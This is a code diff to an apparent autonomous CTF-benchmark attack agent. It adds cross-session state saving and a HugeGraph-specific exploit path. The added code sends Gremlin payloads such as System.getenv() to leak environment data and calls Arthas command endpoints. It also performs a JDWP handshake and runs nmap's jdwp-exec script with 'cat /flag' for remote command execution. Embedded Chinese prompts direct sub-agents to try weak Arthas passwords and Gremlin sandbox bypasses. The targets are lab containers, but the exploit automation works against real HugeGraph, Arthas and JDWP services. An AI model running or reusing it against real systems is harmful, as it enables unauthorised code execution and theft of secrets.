@@ -184,6 +184,7 @@ class FourPillarPipeline:
             "abandoned_challenges": set(),
             "recovery_attempted_challenges": set(),
             "reasoning_challenges": set(),
+            "service_fingerprints": {},
             "probe_unreachable_streaks": {},
             "auto_submitted_flags": set(),
             "last_score": None,
@@ -491,6 +492,98 @@ class FourPillarPipeline:
         safe_session_id = _re_mod.sub(r"[^A-Za-z0-9_.-]+", "_", session_id)
         return base_dir / ".benchmark-state" / f"{safe_session_id}.json"
 
+    def _benchmark_shared_state_path(self) -> Path:
+        """Return the cross-session Benchmark checkpoint path."""
+        raw_base_dir = self._runtime_context.get("session_base_dir")
+        if raw_base_dir:
+            base_dir = Path(str(raw_base_dir)).expanduser()
+        else:
+            base_dir = Path.home() / ".cyber-agent-cli-benchmark"
+        return base_dir / ".benchmark-state" / "shared.json"
+
+    def _merge_benchmark_persisted_state(self, persisted: dict[str, Any]) -> None:
+        """Merge safe-to-reuse Benchmark state into the current run.
+
+        Active containers and current challenge are intentionally not restored:
+        they must be refreshed from the platform API for the current process.
+        """
+        if not persisted:
+            return
+        with self._benchmark_state_lock:
+            for key in (
+                "completed_challenges",
+                "closed_challenges",
+                "abandoned_challenges",
+                "recovery_attempted_challenges",
+                "auto_submitted_flags",
+            ):
+                merged = set(self._benchmark_state.get(key, set()))
+                raw_value = persisted.get(key)
+                if isinstance(raw_value, (list, set, tuple)):
+                    merged.update(str(item) for item in raw_value if item)
+                self._benchmark_state[key] = merged
+            if isinstance(persisted.get("completed_scores"), dict):
+                scores = dict(self._benchmark_state.get("completed_scores", {}))
+                for code, score in persisted["completed_scores"].items():
+                    if isinstance(code, str) and isinstance(score, int):
+                        scores[code] = score
+                self._benchmark_state["completed_scores"] = scores
+            if isinstance(persisted.get("service_fingerprints"), dict):
+                fingerprints = dict(
+                    self._benchmark_state.get("service_fingerprints", {})
+                )
+                for code, fingerprint in persisted["service_fingerprints"].items():
+                    if isinstance(code, str) and isinstance(fingerprint, str):
+                        fingerprints[code] = fingerprint
+                self._benchmark_state["service_fingerprints"] = fingerprints
+            for key in ("api_interface", "tun_interface", "tun_ip", "vpn_config"):
+                value = persisted.get(key)
+                if value and not self._benchmark_state.get(key):
+                    self._benchmark_state[key] = value
+            if persisted.get("vpn_connected") is True:
+                self._benchmark_state["vpn_connected"] = True
+
+    def _load_benchmark_state(self) -> None:
+        """Load shared Benchmark checkpoint so new sessions do not retread closed tasks."""
+        if not self._is_benchmark_aggressive():
+            return
+        candidates: list[Path] = []
+        shared = self._benchmark_shared_state_path()
+        if shared.exists():
+            candidates.append(shared)
+        state_dir = self._benchmark_state_path().parent
+        if state_dir.exists():
+            session_id = self._session_id or str(
+                self._runtime_context.get("session_id") or ""
+            )
+            for path in sorted(
+                state_dir.glob("*.json"),
+                key=lambda item: item.stat().st_mtime,
+                reverse=True,
+            ):
+                if path.name == "shared.json":
+                    continue
+                if session_id and path.stem == session_id:
+                    continue
+                candidates.append(path)
+                break
+        for path in candidates:
+            try:
+                data = json.loads(path.read_text(encoding="utf-8"))
+                state = data.get("state") if isinstance(data, dict) else None
+                if isinstance(state, dict):
+                    self._merge_benchmark_persisted_state(state)
+            except Exception as exc:
+                from ..logging import log_error
+                log_error("benchmark", f"加载 Benchmark 状态失败 {path}: {exc}")
+        if candidates:
+            self._record_trace(
+                "benchmark_state_loaded",
+                detail="已加载 Benchmark 跨会话状态: "
+                + ", ".join(str(path) for path in candidates),
+                metadata=self._benchmark_state_snapshot(),
+            )
+
     def _persist_benchmark_state(self) -> None:
         """Persist a sanitized Benchmark checkpoint for summaries and recovery."""
         if not self._is_benchmark_aggressive():
@@ -510,6 +603,16 @@ class FourPillarPipeline:
                 encoding="utf-8",
             )
             tmp_path.replace(path)
+            shared_path = self._benchmark_shared_state_path()
+            shared_path.parent.mkdir(parents=True, exist_ok=True)
+            shared_payload = dict(payload)
+            shared_payload["session_id"] = "shared"
+            shared_tmp = shared_path.with_suffix(shared_path.suffix + ".tmp")
+            shared_tmp.write_text(
+                json.dumps(shared_payload, ensure_ascii=False, indent=2),
+                encoding="utf-8",
+            )
+            shared_tmp.replace(shared_path)
             self._runtime_context["benchmark_state_file"] = str(path)
         except Exception as exc:
             from ..logging import log_error
@@ -1095,6 +1198,20 @@ class FourPillarPipeline:
         )
         self._persist_benchmark_state()
 
+    def _benchmark_set_service_fingerprint(self, code: str, fingerprint: str) -> None:
+        if not code or not fingerprint:
+            return
+        with self._benchmark_state_lock:
+            fingerprints = dict(self._benchmark_state.get("service_fingerprints", {}))
+            fingerprints[code] = fingerprint
+            self._benchmark_state["service_fingerprints"] = fingerprints
+        self._record_trace(
+            "benchmark_service_fingerprint",
+            detail=f"{code} 服务指纹：{fingerprint}",
+            metadata={"challenge": code, "fingerprint": fingerprint},
+        )
+        self._persist_benchmark_state()
+
     def _benchmark_note_probe_unreachable(self, code: str) -> int:
         if not code:
             return 0
@@ -1139,6 +1256,8 @@ class FourPillarPipeline:
             "swagger",
             "openapi",
             "docs",
+            "hugegraph",
+            '"service":"',
             "flag{",
         )
         return any(marker in lowered for marker in reachable_markers)
@@ -1322,6 +1441,25 @@ class FourPillarPipeline:
                 seen_urls.add(derived)
                 queue.append(derived)
         joined_outputs = "\n".join(outputs)
+        if self._benchmark_probe_suggests_hugegraph(joined_outputs):
+            self._benchmark_set_service_fingerprint(code, "hugegraph")
+            hugegraph_output = self._benchmark_probe_hugegraph_local(
+                code,
+                base,
+                joined_outputs,
+            )
+            if hugegraph_output:
+                outputs.append(hugegraph_output)
+                joined_outputs = "\n".join(outputs)
+            with self._benchmark_state_lock:
+                completed = set(self._benchmark_state.get("completed_challenges", set()))
+            if code in completed:
+                return "\n".join(outputs)
+            self._benchmark_mark_reasoning_needed(
+                code,
+                "HugeGraph/Gremlin/Arthas/JDWP 服务指纹已确认，需要服务专项深挖",
+            )
+            return "\n".join(outputs)
         webapp_output = self._benchmark_probe_common_webapp_flows(code, base, joined_outputs)
         if webapp_output:
             outputs.append(webapp_output)
@@ -1330,6 +1468,215 @@ class FourPillarPipeline:
             raw_output = self._benchmark_probe_raw_text_protocol(code, addr)
             if raw_output:
                 outputs.append(raw_output)
+        return "\n".join(outputs)
+
+    @staticmethod
+    def _benchmark_probe_suggests_hugegraph(probe: str) -> bool:
+        lowered = probe.lower()
+        return (
+            '"service":"hugegraph"' in lowered
+            or '"service": "hugegraph"' in lowered
+            or "hugegraph.apache.org" in lowered
+            or '"gremlin"' in lowered and '"arthas"' in lowered
+        )
+
+    def _benchmark_probe_hugegraph_local(self, code: str, base: str, probe: str) -> str:
+        """Run bounded HugeGraph-specific checks before falling back to reasoning."""
+        tun_interface = self._benchmark_tun_interface()
+        outputs: list[str] = [f"## hugegraph-probe {base}"]
+
+        def append_http(label: str, result: subprocess.CompletedProcess[str]) -> None:
+            body = (result.stdout or "")[:5000]
+            outputs.append(
+                f"## {label}\n{body}\n{(result.stderr or '')[:500]}"
+            )
+            self._benchmark_auto_submit_flags_from_tool_result(
+                f"命令: hugegraph_probe {label} {base}\n"
+                "工作目录: /home/my/cyber/benchmark_test\n"
+                f"退出码: {result.returncode}\n"
+                "输出:\n"
+                f"{body}"
+            )
+
+        for path in (
+            "versions",
+            "graphs",
+            "graphs/hugegraph/schema",
+            "graphs/hugegraph/variables",
+            "graphs/hugegraph/conf",
+            "graphs/hugegraph/graph/vertices?limit=10",
+            "graphs/hugegraph/graph/edges?limit=10",
+        ):
+            result = self._benchmark_curl_local(
+                _urljoin(base, path),
+                tun_interface=tun_interface,
+                timeout=7,
+            )
+            append_http(f"GET /{path}", result)
+            with self._benchmark_state_lock:
+                completed = set(self._benchmark_state.get("completed_challenges", set()))
+            if code in completed:
+                return "\n".join(outputs)
+
+        for expression in (
+            "System.getenv()",
+            "System.getProperties()",
+            "hugegraph.traversal().V().limit(10).toList()",
+            "hugegraph.traversal().E().limit(10).toList()",
+        ):
+            cmd = [
+                "curl",
+                "-sS",
+                "-k",
+                "--interface",
+                tun_interface,
+                "--connect-timeout",
+                "2",
+                "--max-time",
+                "8",
+                "--globoff",
+                "-i",
+                "-X",
+                "POST",
+                "-H",
+                "Content-Type: application/json",
+                "-d",
+                json.dumps({"gremlin": expression}, separators=(",", ":")),
+                _urljoin(base, "gremlin"),
+            ]
+            try:
+                result = subprocess.run(
+                    cmd,
+                    check=False,
+                    text=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    timeout=10,
+                )
+            except Exception as exc:
+                result = subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))
+            append_http(f"POST /gremlin {expression}", result)
+            with self._benchmark_state_lock:
+                completed = set(self._benchmark_state.get("completed_challenges", set()))
+            if code in completed:
+                return "\n".join(outputs)
+
+        arthas = self._benchmark_curl_json_local(
+            _urljoin(base, "arthas"),
+            tun_interface=tun_interface,
+            method="PUT",
+            payload={"command": "help"},
+            timeout=8,
+        )
+        append_http("PUT /arthas help", arthas)
+
+        parsed = _urlparse(base)
+        host = parsed.hostname or ""
+        if host:
+            for port, label in ((5005, "JDWP"), (8561, "Arthas HTTP"), (8562, "Arthas telnet")):
+                reachable = self._benchmark_probe_tcp_port(host, port)
+                outputs.append(f"## {label} {host}:{port}\nreachable={reachable}")
+            jdwp_output = self._benchmark_probe_jdwp_local(host, 5005)
+            if jdwp_output:
+                outputs.append(jdwp_output)
+                self._benchmark_auto_submit_flags_from_tool_result(
+                    f"命令: jdwp_probe http://{host}:5005\n"
+                    "工作目录: /home/my/cyber/benchmark_test\n"
+                    "退出码: 0\n"
+                    "输出:\n"
+                    f"{jdwp_output}"
+                )
+        return "\n".join(outputs)
+
+    def _benchmark_curl_json_local(
+        self,
+        url: str,
+        *,
+        tun_interface: str,
+        method: str = "POST",
+        payload: dict[str, Any] | None = None,
+        timeout: int = 8,
+    ) -> subprocess.CompletedProcess[str]:
+        cmd = [
+            "curl",
+            "-sS",
+            "-k",
+            "--interface",
+            tun_interface,
+            "--connect-timeout",
+            "2",
+            "--max-time",
+            str(max(3, timeout - 2)),
+            "--globoff",
+            "-i",
+            "-X",
+            method.upper(),
+            "-H",
+            "Content-Type: application/json",
+        ]
+        if payload is not None:
+            cmd.extend(["-d", json.dumps(payload, ensure_ascii=False, separators=(",", ":"))])
+        cmd.append(url)
+        try:
+            return subprocess.run(
+                cmd,
+                check=False,
+                text=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                timeout=timeout,
+            )
+        except Exception as exc:
+            return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))
+
+    @staticmethod
+    def _benchmark_probe_tcp_port(host: str, port: int) -> bool:
+        try:
+            with socket_mod.create_connection((host, port), timeout=2):
+                return True
+        except OSError:
+            return False
+
+    def _benchmark_probe_jdwp_local(self, host: str, port: int) -> str:
+        if not self._benchmark_probe_tcp_port(host, port):
+            return ""
+        outputs = [f"## jdwp-probe {host}:{port}", "JDWP port reachable"]
+        try:
+            with socket_mod.create_connection((host, port), timeout=3) as sock:
+                sock.settimeout(3)
+                sock.sendall(b"JDWP-Handshake")
+                reply = sock.recv(14)
+                outputs.append(f"handshake={reply.decode('ascii', errors='replace')!r}")
+        except OSError as exc:
+            outputs.append(f"handshake_error={exc}")
+            return "\n".join(outputs)
+
+        nmap_cmd = [
+            "nmap",
+            "-n",
+            "-Pn",
+            "-sT",
+            f"-p{port}",
+            "--script=+jdwp-exec",
+            "--script-args",
+            "cmd=cat /flag",
+            host,
+        ]
+        try:
+            result = subprocess.run(
+                nmap_cmd,
+                check=False,
+                text=True,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                timeout=20,
+            )
+            outputs.append(
+                "## jdwp-exec cat /flag\n"
+                f"{(result.stdout or '')[:5000]}\n{(result.stderr or '')[:1000]}"
+            )
+        except Exception as exc:
+            outputs.append(f"jdwp_exec_error={exc}")
         return "\n".join(outputs)
 
     def _benchmark_probe_common_webapp_flows(self, code: str, base: str, probe: str) -> str:
@@ -1649,6 +1996,12 @@ class FourPillarPipeline:
         base = f"http://{addr}/"
         tun_interface = self._benchmark_tun_interface()
         outputs: list[str] = [f"## handoff-followup {base}"]
+        root = self._benchmark_curl_local(base, tun_interface=tun_interface, timeout=7)
+        root_text = root.stdout or ""
+        if self._benchmark_probe_suggests_hugegraph(root_text):
+            self._benchmark_set_service_fingerprint(code, "hugegraph")
+            outputs.append(self._benchmark_probe_hugegraph_local(code, base, root_text))
+            return "\n".join(outputs)
         cookie_file = tempfile.NamedTemporaryFile(prefix="cyber-agent-bench-follow-", suffix=".cookies", delete=False)
         cookie_path = cookie_file.name
         cookie_file.close()
@@ -1943,6 +2296,10 @@ class FourPillarPipeline:
             code, addrs = self._benchmark_active_challenge_from_state()
             if not code:
                 return "确定性 handoff：当前没有 active 容器，跳过。"
+            with self._benchmark_state_lock:
+                fingerprints = dict(self._benchmark_state.get("service_fingerprints", {}))
+            if fingerprints.get(code) == "hugegraph":
+                return None
             probe = self._benchmark_probe_handoff_followup_local(code, addrs)
             with self._benchmark_state_lock:
                 completed = set(self._benchmark_state.get("completed_challenges", set()))
@@ -1951,6 +2308,19 @@ class FourPillarPipeline:
                 return (
                     f"确定性 handoff：{code} 后续假设提交成功并关闭。\n"
                     f"close 返回: {closed[:200]}\n探测摘要:\n{probe[:3000]}"
+                )
+            if any(
+                marker in probe.lower()
+                for marker in ("hugegraph", "gremlin", "arthas", "jdwp")
+            ):
+                self._benchmark_mark_reasoning_needed(
+                    code,
+                    "服务专项线索仍有利用空间，禁止按普通 Web 低收益题关闭",
+                )
+                return (
+                    f"确定性 handoff：{code} 发现/确认服务专项线索，"
+                    "保留 active 给四柱继续深挖，不标记 abandoned。\n"
+                    f"探测摘要:\n{probe[:3000]}"
                 )
             self._benchmark_mark_abandoned(code, "handoff 高置信后续假设无 flag")
             return (
@@ -1964,9 +2334,16 @@ class FourPillarPipeline:
                 return "确定性 handoff：当前没有 active 容器，无需 close。"
             with self._benchmark_state_lock:
                 completed = set(self._benchmark_state.get("completed_challenges", set()))
+                reasoning = set(self._benchmark_state.get("reasoning_challenges", set()))
+                abandoned = set(self._benchmark_state.get("abandoned_challenges", set()))
             if code in completed:
                 closed = self._benchmark_close_local(code)
                 return f"确定性 handoff：{code} 已完成，close 返回: {closed[:200]}"
+            if code in reasoning and code not in abandoned:
+                return (
+                    f"确定性 handoff：{code} 仍处于 reasoning 状态且未被判定低收益，"
+                    "跳过机械 close，保留 active 给四柱/runner 继续服务专项利用。"
+                )
             closed = self._benchmark_close_local(code)
             return f"确定性 handoff：{code} 无直接突破，已 close 释放资源: {closed[:300]}"
         if "Benchmark fast setup" in desc:
@@ -2485,6 +2862,9 @@ class FourPillarPipeline:
                 self._benchmark_state.get("recovery_attempted_challenges", set())
             )
             reasoning_set = set(self._benchmark_state.get("reasoning_challenges", set()))
+            service_fingerprints = dict(
+                self._benchmark_state.get("service_fingerprints", {})
+            )
             unreachable_streaks = dict(
                 self._benchmark_state.get("probe_unreachable_streaks", {})
             )
@@ -2524,11 +2904,16 @@ class FourPillarPipeline:
                         and addrs
                         and code not in completed_set
                     ):
+                        closed_set.discard(code)
+                        abandoned_set.discard(code)
+                        recovered_set.discard(code)
                         active[code] = [str(addr) for addr in addrs]
+                        current_challenge = code
             for code in completed_set | closed_set:
                 active.pop(code, None)
                 abandoned_set.discard(code)
                 reasoning_set.discard(code)
+                service_fingerprints.pop(code, None)
                 unreachable_streaks.pop(code, None)
             if self._benchmark_state.get("task_finished"):
                 active = {}
@@ -2539,6 +2924,7 @@ class FourPillarPipeline:
             self._benchmark_state["abandoned_challenges"] = abandoned_set
             self._benchmark_state["recovery_attempted_challenges"] = recovered_set
             self._benchmark_state["reasoning_challenges"] = reasoning_set
+            self._benchmark_state["service_fingerprints"] = service_fingerprints
             self._benchmark_state["probe_unreachable_streaks"] = unreachable_streaks
             if current_challenge and current_challenge not in completed_set and current_challenge not in closed_set:
                 self._benchmark_state["current_challenge"] = current_challenge
@@ -2631,6 +3017,9 @@ class FourPillarPipeline:
             "reasoning_challenges": sorted(
                 self._benchmark_state.get("reasoning_challenges", set())
             ),
+            "service_fingerprints": dict(
+                self._benchmark_state.get("service_fingerprints", {})
+            ),
             "probe_unreachable_streaks": dict(
                 self._benchmark_state.get("probe_unreachable_streaks", {})
             ),
@@ -2719,6 +3108,16 @@ class FourPillarPipeline:
                 "VPN 启动、重复读取目录、批量 list/start 新题等任务；必须先围绕当前"
                 " active 容器的页面/API/源码/配置线索验证。"
             )
+        fingerprints = state.get("service_fingerprints") or {}
+        if isinstance(fingerprints, dict) and fingerprints:
+            parts.append(
+                "已识别服务指纹："
+                + ", ".join(
+                    f"{code}={fingerprint}"
+                    for code, fingerprint in sorted(fingerprints.items())
+                )
+                + "；后续攻击路径必须围绕该真实服务类型，不要套用无关 Web/PHP 模板。"
+            )
         if state.get("last_score") is not None:
             parts.append(f"最近题目累计得分：{state['last_score']}。")
         return "\n".join(parts)
@@ -2750,17 +3149,66 @@ class FourPillarPipeline:
         addrs = active.get(current) if isinstance(active, dict) else None
         addr_text = ", ".join(str(addr) for addr in addrs or []) or "平台状态中的当前地址"
         context = self._benchmark_state_context()
+        fingerprints = state.get("service_fingerprints") or {}
+        if isinstance(fingerprints, dict) and fingerprints.get(current) == "hugegraph":
+            hugegraph_context = (
+                f"{context}\n\n"
+                "## 当前题专项线索\n"
+                "fast path 已识别当前服务为 HugeGraph/Gremlin/Arthas/JDWP 类 Java 服务。"
+                "根路径、/versions、/graphs、/graphs/hugegraph/conf、/gremlin、/arthas "
+                "和 JDWP 5005 是优先路径。不要继续做普通 Web/PHP/LFI/目录枚举。"
+                "如果 nmap jdwp-exec 因本机 nselib 解析错误失败，应改用 jdb、自定义 JDWP、"
+                "Arthas 或 Gremlin 侧信道，不要重复 HTTP 字典扫描。"
+            )
+            return [
+                {
+                    "role": "runner",
+                    "task_description": (
+                        f"Benchmark handoff step 1：只复核当前 active 题 {current} "
+                        f"({addr_text}) 的 HugeGraph 指纹和关键端口。禁止 setup/VPN/"
+                        "toolchain/list/start。只允许访问 /、/versions、/graphs、"
+                        "/graphs/hugegraph/conf、/gremlin、/arthas，并探测 5005/8561/8562。"
+                        "发现 flag{...} 立即 submit。"
+                    ),
+                    "context": hugegraph_context,
+                    "parallel": False,
+                },
+                {
+                    "role": "runner",
+                    "task_description": (
+                        f"Benchmark hugegraph exploit step 2：只围绕 {current} 的 "
+                        "HugeGraph/Gremlin/Arthas/JDWP 选择一个最高置信利用路径。"
+                        "优先顺序：1) JDWP 5005 读取 /flag 或执行 cat /flag；"
+                        "2) Arthas 8561/8562 默认/弱口令后执行命令；"
+                        "3) Gremlin System.getenv/System.getProperties 或 HugeGraph API "
+                        "泄露。禁止继续普通 HTTP 目录枚举、SQLi、XSS、PHP/LFI。"
+                        "最多验证一个主假设和一个备选假设；发现 flag 立即 submit。"
+                    ),
+                    "context": hugegraph_context,
+                    "parallel": False,
+                },
+                {
+                    "role": "runner",
+                    "task_description": (
+                        f"Benchmark hugegraph close step 3：只有当 {current} 的 JDWP、"
+                        "Arthas、Gremlin 三条路径均无新线索且无 flag 时，才 close?"
+                        f"unique_code={current}；否则保留 active 并返回下一步具体利用点。"
+                    ),
+                    "context": hugegraph_context,
+                    "parallel": False,
+                },
+            ]
         return [
             {
                 "role": "runner",
                 "task_description": (
                     f"Benchmark handoff step 1：只深挖当前 active 题 {current} "
                     f"({addr_text})，禁止 setup/VPN/toolchain/list/start。所有 10.x 请求必须 "
-                    "curl --interface tun0。复用 fast path 已发现的网页登录/LFI/源码泄露线索："
-                    "若页面有测试账号先带 cookie 登录；若存在 download.php?id 或文件参数，"
-                    "优先读 /etc/passwd、/var/www/html/includes/config.php、download.php、"
-                    "upload.php、dashboard.php、.htaccess，并从源码继续派生文件名、硬编码账号、"
-                    "隐藏 API。发现 flag{...} 立即 submit。"
+                    "curl --interface tun0。先复核 fast path 的服务指纹，再按真实响应选择路径："
+                    "若是 HugeGraph/Gremlin/Arthas/JDWP，优先查 /versions、/graphs、/gremlin "
+                    "System.getenv/System.getProperties、Arthas 8561/8562、JDWP 5005；"
+                    "若是网页登录/PHP/LFI，才带 cookie 登录并验证 download/file/path/source/config。"
+                    "发现 flag{...} 立即 submit。"
                 ),
                 "context": context,
                 "parallel": False,
@@ -2769,7 +3217,8 @@ class FourPillarPipeline:
                 "role": "runner",
                 "task_description": (
                     f"Benchmark handoff step 2：继续当前题 {current} 的一个最高置信后续假设，"
-                    "例如管理员凭据、审批/contract/init/config 命名端点、敏感合同文件、"
+                    "必须由真实响应驱动：HugeGraph 优先 JDWP/Arthas/Gremlin 沙箱绕过或配置泄露；"
+                    "Web 题才尝试管理员凭据、审批/contract/init/config 命名端点、敏感文件、"
                     "上传后日志/路径泄露。最多验证一个主假设和一个备选假设；无新响应差异就停止。"
                     "发现 flag/secret/候选答案立即 submit。"
                 ),
@@ -4650,6 +5099,7 @@ class FourPillarPipeline:
         self._trace_id = (
             f"{self._session_id}-{datetime.now().strftime('%Y%m%d_%H%M%S')}"
         )
+        self._load_benchmark_state()
 
         self._append_pipeline_user_message(user_input)
         self._record_trace("pipeline_start", detail=user_input)
